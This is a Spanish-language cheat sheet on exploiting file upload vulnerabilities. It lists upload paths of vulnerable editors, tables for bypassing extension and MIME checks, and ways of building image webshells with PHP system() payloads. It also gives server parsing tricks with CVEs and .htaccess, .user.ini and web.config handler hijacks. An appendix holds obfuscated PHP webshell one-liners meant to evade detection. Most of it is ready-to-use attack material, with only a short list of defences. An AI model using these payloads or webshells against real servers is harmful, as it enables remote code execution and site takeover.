# Seguridad Web - Vulnerabilidad de carga de archivos

> Fuente: Base de datos de vulnerabilidades WooYun | Extraído de web-file-infra.md

## I. Vulnerabilidad de carga de archivos

### 1.1 Naturaleza de la vulnerabilidad

```
Cadena de ataque: Descubrimiento del punto de carga → Bypass de detección → Obtención de la ruta → Explotación mediante análisis (parsing) → Ejecución de Webshell
Tasa de éxito = P(bypass de detección) × P(obtención de la ruta) × P(ejecución vía parsing)
```

Contradicción central: requisito funcional (permitir la carga) vs. requisito de seguridad (restringir la ejecución). La mayoría de las defensas solo se centran en "evadir la detección", ignorando la filtración de rutas y la configuración de análisis (parsing).

### 1.2 Identificación de puntos de carga

| Tipo de punto de carga | Frecuencia | Riesgo | Ruta típica |
|-----------|------|------|---------|
| Editor de texto enriquecido | 42% | Muy alto | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| Carga de avatar | 18% | Alto | `/upload/avatar/`, `/member/uploadfile/` |
| Adjuntos/documentos | 15% | Alto | `/uploads/`, `/attachment/` |
| Función de backend/administración | 12% | Muy alto | `/admin/upload/`, `/system/upload/` |
| Función de importación | 5% | Alto | `/import/`, `/excelUpload/` |

Rutas de prueba de editores:

| Editor | Ruta de prueba | Interfaz de carga |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

### 1.3 Técnicas de bypass - Extensión de archivo

Tabla de referencia rápida para bypass de listas negras:

| Técnica | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| Mayúsculas/minúsculas | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| Doble escritura | `.pphphp` | `.asaspp` | `.jsjspp` |
| Sufijo especial | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| Espacio/punto | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| Truncamiento %00 | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| Punto y coma (IIS) | N/A | `.asp;.jpg` | N/A |
| Salto de línea (Apache) | `.php\x0a` | N/A | N/A |

Métodos de bypass de listas blancas:

| Técnica | Principio | Condición |
|-----|------|------|
| Vulnerabilidad de parsing | Se carga un archivo de la lista blanca pero se analiza de forma especial | Vulnerabilidad de IIS/Apache/Nginx |
| Múltiples extensiones en Apache | `shell.php.jpg` se analiza como php | Configuración de múltiples extensiones de Apache |
| Truncamiento %00 | `shell.php%00.jpg` | PHP < 5.3.4 |
| Carga de archivo de configuración | Cargar `.htaccess`/`.user.ini` | Se permite txt/archivos de configuración |
| Imagen con webshell + LFI | Cargar imagen con webshell combinada con inclusión de archivos | Existe vulnerabilidad LFI |

### 1.4 Técnicas de bypass - MIME/Content-Type

```
Modificar el Content-Type a los siguientes valores permite el bypass:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (genérico)

Ejemplo de modificación interceptando con Burp:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- Punto de modificación clave
```

### 1.5 Técnicas de bypass - Detección de cabecera/contenido de archivo

Magic Numbers de archivos comunes:

| Tipo | Magic Number (Hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | Sin ASCII legible |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

Creación de imagen con webshell:

```bash
# Método 1: agregar cabecera de archivo de forma simple
GIF89a<?php system($_POST['cmd']); ?>

# Método 2: fusionar archivos
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# Método 3: inyección EXIF
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 1.6 Vulnerabilidades de parsing del servidor web

```
IIS 5.x/6.0:
  Análisis de directorio: /shell.asp/1.jpg     -> se analiza como ASP
  Análisis de archivo: shell.asp;.jpg          -> se analiza como ASP
  Análisis deforme: shell.asp.jpg              -> puede analizarse como ASP

Apache:
  Múltiples extensiones: shell.php.xxx          -> se analiza de derecha a izquierda
  .htaccess: AddType application/x-httpd-php .jpg
  Análisis con salto de línea: shell.php%0a     -> CVE-2017-15715

Nginx:
  Análisis deforme: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  Byte nulo: shell.jpg%00.php            -> vulnerabilidad de versiones antiguas

Tomcat:
  Método PUT: PUT /shell.jsp/       -> CVE-2017-12615
```

### 1.7 Secuestro de análisis mediante archivo de configuración

```apache
# .htaccess: hace que jpg se analice como PHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): incluye automáticamente la imagen con webshell
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): hace que jpg sea procesado por FastCGI -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 Explotación de condición de carrera

```
Principio: existe una ventana de tiempo entre la carga y la eliminación
Explotación: carga y acceso multihilo, ejecutando el código malicioso antes de que sea eliminado
Técnica: el archivo malicioso primero genera un nuevo archivo en otra ubicación, el cual no es eliminado por el mecanismo de limpieza
```

### 1.9 Medidas de defensa

1. Validación de lista blanca: permitir solo extensiones específicas (`.jpg .png .gif .pdf`)
2. Validación en múltiples capas: extensión + MIME (finfo_file) + cabecera de archivo + getimagesize()
3. Renombrado de archivos: `uniqid() + extensión fija`, eliminando por completo el nombre de archivo original
4. Prohibir ejecución: denegar permisos de ejecución de scripts en el directorio de carga
5. Privilegios mínimos: `chmod 0644`, no ejecutable por el usuario web
6. Verificar antes de almacenar: validar primero y luego almacenar, usando operaciones atómicas para prevenir condiciones de carrera
7. Ocultamiento de ruta: no devolver la ruta completa, usar CDN o URLs aleatorizadas

---


---
## Anexo: Referencia rápida de técnicas de evasión (anti-detección) para Webshell

## Anexo B: Referencia rápida de técnicas de evasión (anti-detección) para Webshell

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // Concatenación de variables
array_map('ass'.'ert', array($_POST['x']));            // Función de callback
$f = create_function('', $_POST['x']); $f();           // Función dinámica
set_exception_handler('system');                        // Manejo de excepciones
throw new Exception($_POST['cmd']);
```

